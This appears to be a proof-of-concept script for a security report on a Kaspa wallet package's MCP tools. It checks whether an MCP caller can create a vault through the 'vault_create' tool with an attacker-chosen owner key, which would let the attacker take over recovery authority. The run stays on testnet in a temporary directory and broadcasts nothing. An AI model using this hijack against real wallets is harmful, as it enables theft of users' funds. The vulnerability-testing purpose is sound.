#!/usr/bin/env node

import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import process from "node:process";
import { pathToFileURL } from "node:url";

function usage() {
  process.stderr.write(
    "usage: node vault-recovery-authority-hijack.mjs --source-root <built-sompi-tree>\n"
  );
}

function parseSourceRoot(arguments_) {
  if (arguments_.length === 2 && arguments_[0] === "--source-root" && arguments_[1]) {
    return path.resolve(arguments_[1]);
  }
  if (arguments_.length === 0 && process.env.SOMPI_SOURCE_ROOT) {
    return path.resolve(process.env.SOMPI_SOURCE_ROOT);
  }
  usage();
  process.exitCode = 2;
  return undefined;
}

async function importFrom(sourceRoot, relativePath) {
  const target = path.join(sourceRoot, relativePath);
  if (!fs.statSync(target, { throwIfNoEntry: false })?.isFile()) {
    throw new Error(`required built module is missing: ${relativePath}`);
  }
  return import(pathToFileURL(target).href);
}

function emit(result) {
  process.stdout.write(`${JSON.stringify(result, null, 2)}\n`);
}

async function main() {
  const sourceRoot = parseSourceRoot(process.argv.slice(2));
  if (!sourceRoot) return;

  const packageJson = JSON.parse(
    fs.readFileSync(path.join(sourceRoot, "package.json"), "utf8")
  );
  const [{ registerSompiTools }, { Keypair, PrivateKey }, { VaultManager }] =
    await Promise.all([
      importFrom(sourceRoot, "dist/mcp/server.js"),
      importFrom(sourceRoot, "dist/kaspa-wasm.js"),
      importFrom(sourceRoot, "dist/vault.js"),
    ]);

  const stateDirectory = fs.mkdtempSync(
    path.join(os.tmpdir(), "sompi-vault-recovery-poc-")
  );
  const attackerPrivateHex = "03".padStart(64, "0");
  const attackerPrivate = new PrivateKey(attackerPrivateHex);
  const attackerKeypair = Keypair.fromPrivateKey(attackerPrivate);
  const attackerPublic = String(attackerKeypair.xOnlyPublicKey).toLowerCase();
  const vault = new VaultManager(stateDirectory, "testnet-10");
  const handlers = new Map();
  const unavailable = async () => {
    throw new Error("an unrelated runtime dependency was unexpectedly invoked");
  };

  const runtime = {
    wallet: {
      networkId: "testnet-10",
      address: "kaspatest:qpocnotused",
      balanceSompi: unavailable,
      feeEstimate: unavailable,
      serverInfo: unavailable,
    },
    vault,
    journal: { integrityCheck: () => true },
    policy: { describe: () => ({}) },
    purchase: {
      purchase: unavailable,
      status: unavailable,
      recover: unavailable,
    },
    close: unavailable,
  };

  try {
    registerSompiTools(
      {
        registerTool(name, _config, handler) {
          handlers.set(name, handler);
        },
      },
      runtime
    );

    const handler = handlers.get("vault_create");
    if (!handler) {
      emit({
        vulnerable: false,
        packageVersion: packageJson.version,
        reason: "vault_create is not exposed to the MCP caller",
        broadcastAttempted: false,
      });
      return;
    }

    const response = await handler({
      maxOutflowSompi: "100000000",
      ownerPublicKey: attackerPublic,
    });
    if (response.isError === true || !vault.configured) {
      emit({
        vulnerable: false,
        packageVersion: packageJson.version,
        reason: "the MCP assignment was rejected",
        broadcastAttempted: false,
      });
      return;
    }

    const decoded = JSON.parse(response.content[0].text);
    const persisted = vault.config();
    const attackerOwnerPersisted = persisted.ownerPublic === attackerPublic;
    const mcpAccepted = decoded.status === "created_needs_deposit";

    emit({
      vulnerable: mcpAccepted && attackerOwnerPersisted,
      packageVersion: packageJson.version,
      network: "testnet-10",
      mcpAccepted,
      configured: vault.configured,
      attackerOwnerPersisted,
      attackerPrivateMatchesOwnPublic: attackerPublic === persisted.ownerPublic,
      ownerPublic: persisted.ownerPublic,
      broadcastAttempted: false,
    });
  } finally {
    attackerKeypair.free();
    attackerPrivate.free();
    fs.rmSync(stateDirectory, { recursive: true, force: true });
  }
}

main().catch((error) => {
  process.stderr.write(`PoC failed: ${error instanceof Error ? error.message : String(error)}\n`);
  process.exitCode = 1;
});
